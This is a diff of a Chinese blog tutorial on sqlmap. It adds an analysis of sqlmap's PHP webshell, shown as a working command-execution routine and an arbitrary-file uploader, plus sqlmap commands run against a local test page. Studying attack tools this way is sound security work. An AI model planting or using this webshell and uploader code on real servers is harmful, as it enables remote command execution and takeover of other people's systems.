@@ -14,7 +14,7 @@
 <meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
 
 <meta name="description" content="SQLMAP 新手教程（二）"><link rel="alternate" href="/pwn4justice.github.io/atom.xml" title="J.A.R.V.I.S"><link rel="shortcut icon" type="image/x-icon" href="/pwn4justice.github.io/favicon.ico?v=2.11.0">
-<link rel="canonical" href="https://pwn4justice.github.io/2019/06/20/SQLMAP-新手教程（二）/">
+<link rel="canonical" href="https://pwn4justice.github.io/2019/07/02/SQLMAP-新手教程（二）/">
 
 <link rel="stylesheet" type="text/css" href="/pwn4justice.github.io/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/pwn4justice.github.io/lib/nprogress/nprogress.min.css">
 <link rel="stylesheet" type="text/css" href="/pwn4justice.github.io/css/style.css?v=2.11.0">
@@ -95,7 +95,7 @@
 
       <div class="post-meta">
         <span class="post-time">
-          2019-06-20
+          2019-07-02
         </span></div>
     </header>
 
@@ -141,17 +141,28 @@
 <p><code>f( $n )</code> 函数就是用来判断函数能不能被执行的，同时将命令末尾加上错误重定向：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$c = $c.<span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span><span class="params">($n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $z;</span><br><span class="line">        <span class="keyword">return</span> is_callable($n) <span class="keyword">and</span> ! in_array($n, $z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>接下来就是一步一步测试哪个高危PHP函数（见:<a href>高危PHP函数列表</a>）没有被管理员禁止，并调用那个函数来执行系统命令：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f(<span class="string">"system"</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $w = ob_get_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"proc_open"</span>)) &#123;</span><br><span class="line">        $y = proc_open($c, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), $t);</span><br><span class="line">        $w = <span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (!feof($t[<span class="number">1</span>])) &#123; $w. = fread($t[<span class="number">1</span>], <span class="number">512</span>); &#125;@proc_close($y);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"shell_exec"</span>)) &#123;</span><br><span class="line">        $w = shell_exec($c);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"passthru"</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $w = ob_get_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"popen"</span>)) &#123;</span><br><span class="line">        $x = popen($c, r);</span><br><span class="line">        $w = <span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($x)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!feof($x)) &#123; $w. = fread($x, <span class="number">512</span>); &#125;</span><br><span class="line">        &#125;@pclose($x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(f(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">        $w = <span class="keyword">array</span>();</span><br><span class="line">        exec($c, $w);</span><br><span class="line">        $w = join(chr(<span class="number">10</span>), $w).chr(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; $w = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$w"</span></span><br></pre></td></tr></table></figure>
+<p>接下来就是一步一步测试哪个高危PHP函数（见:<a href="https://pwn4justice.github.io/pwn4justice.github.io/2019/07/01/高危PHP函数/">高危PHP函数列表</a>）没有被管理员禁止，并调用那个函数来执行系统命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f(<span class="string">"system"</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $w = ob_get_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"proc_open"</span>)) &#123;</span><br><span class="line">        $y = proc_open($c, <span class="keyword">array</span>(<span class="keyword">array</span>(pipe, r), <span class="keyword">array</span>(pipe, w), <span class="keyword">array</span>(pipe, w)), $t);</span><br><span class="line">        $w = <span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (!feof($t[<span class="number">1</span>])) &#123; $w. = fread($t[<span class="number">1</span>], <span class="number">512</span>); &#125;@proc_close($y);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"shell_exec"</span>)) &#123;</span><br><span class="line">        $w = shell_exec($c);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"passthru"</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $w = ob_get_clean();</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"popen"</span>)) &#123;</span><br><span class="line">        $x = popen($c, r);</span><br><span class="line">        $w = <span class="keyword">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($x)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!feof($x)) &#123; $w.= fread($x, <span class="number">512</span>); &#125;</span><br><span class="line">        &#125;@pclose($x);</span><br><span class="line">&#125;<span class="keyword">elseif</span>(f(<span class="string">"exec"</span>)) &#123;</span><br><span class="line">        $w = <span class="keyword">array</span>();</span><br><span class="line">        exec($c, $w);</span><br><span class="line">        $w = join(chr(<span class="number">10</span>), $w).chr(<span class="number">10</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123; $w = <span class="number">0</span>; &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$w"</span></span><br></pre></td></tr></table></figure>
 
 <br>
 
 <p><strong>code2.php</strong></p>
+<p>这个 PHP 文件是用来处理上传的（小马？），应该是 SQLMAP 用来将上文那个 PHP webshell 文件上传至服务器，它构造了一个表单，并由 SQLMAP 填充需要上传的值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;form action="</span>.$_SERVER[<span class="string">"PHP_SELF"</span>].<span class="string">" method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\phpStudy5.2\WWW\&gt;&lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>对不同 PHP 版本的判断并上传：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">        $dir = $_REQUEST[<span class="string">"uploadDir"</span>];</span><br><span class="line">        <span class="keyword">if</span> (phpversion() &lt; <span class="string">'4.1.0'</span>) &#123;</span><br><span class="line">                $file = $HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">				@move_uploaded_file($HTTP_POST_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir.<span class="string">"/"</span>.$file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $file = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">				@move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dir.<span class="string">"/"</span>.$file) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line">        &#125;@chmod($dir.<span class="string">"/"</span>.$file, <span class="number">0755</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File uploaded"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <br>
 
-<h4 id="3-获取当前数据库名称"><a href="#3-获取当前数据库名称" class="headerlink" title="(3) 获取当前数据库名称"></a>(3) 获取当前数据库名称</h4><br>
+<h4 id="3-获取当前数据库名称"><a href="#3-获取当前数据库名称" class="headerlink" title="(3) 获取当前数据库名称"></a>(3) 获取当前数据库名称</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/diy/sqli.php&quot; --current-db</span><br></pre></td></tr></table></figure>
 
-<h4 id="4-执行SQL命令"><a href="#4-执行SQL命令" class="headerlink" title="(4) 执行SQL命令"></a>(4) 执行SQL命令</h4><br>
+<p><img src="currentdb.jpg" alt="currentdb"></p>
+<br>
+
+<h4 id="4-执行SQL命令"><a href="#4-执行SQL命令" class="headerlink" title="(4) 执行SQL命令"></a>(4) 执行SQL命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/diy/sqli.php&quot; --sql-shell</span><br><span class="line">sqlmap.py -u &quot;http://127.0.0.1/diy/sqli.php&quot; --sql-query=&quot;sql&quot;</span><br></pre></td></tr></table></figure>
+
+<br>
 
 <h4 id="5-POST提交方式"><a href="#5-POST提交方式" class="headerlink" title="(5) POST提交方式"></a>(5) POST提交方式</h4><br>
 
@@ -173,7 +184,7 @@
     </p>
     <p class="copyright-item">
       <span>原文链接: </span>
-      <a href="https://pwn4justice.github.io/2019/06/20/SQLMAP-新手教程（二）/">https://pwn4justice.github.io/2019/06/20/SQLMAP-新手教程（二）/</a>
+      <a href="https://pwn4justice.github.io/2019/07/02/SQLMAP-新手教程（二）/">https://pwn4justice.github.io/2019/07/02/SQLMAP-新手教程（二）/</a>
     </p>
     <p class="copyright-item">
       <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
@@ -181,13 +192,13 @@
   </div>
       <footer class="post-footer">
         
-        <nav class="post-nav"><a class="prev" href="/pwn4justice.github.io/2019/06/21/lxml-etree-tutorial-final-part/">
+        <nav class="post-nav"><a class="prev" href="/pwn4justice.github.io/2019/07/07/XPath-学习（一）/">
         <i class="iconfont icon-left"></i>
-        <span class="prev-text nav-default">lxml.etree tutorial - final part</span>
+        <span class="prev-text nav-default">XPath 学习（一）</span>
         <span class="prev-text nav-mobile">上一篇</span>
       </a>
-    <a class="next" href="/pwn4justice.github.io/2019/06/16/lxml-etree-tutorial-part-six/">
-        <span class="next-text nav-default">lxml.etree tutorial - part six</span>
+    <a class="next" href="/pwn4justice.github.io/2019/07/01/高危PHP函数/">
+        <span class="next-text nav-default">高危PHP函数</span>
         <span class="prev-text nav-mobile">下一篇</span>
         <i class="iconfont icon-right"></i>
       </a>
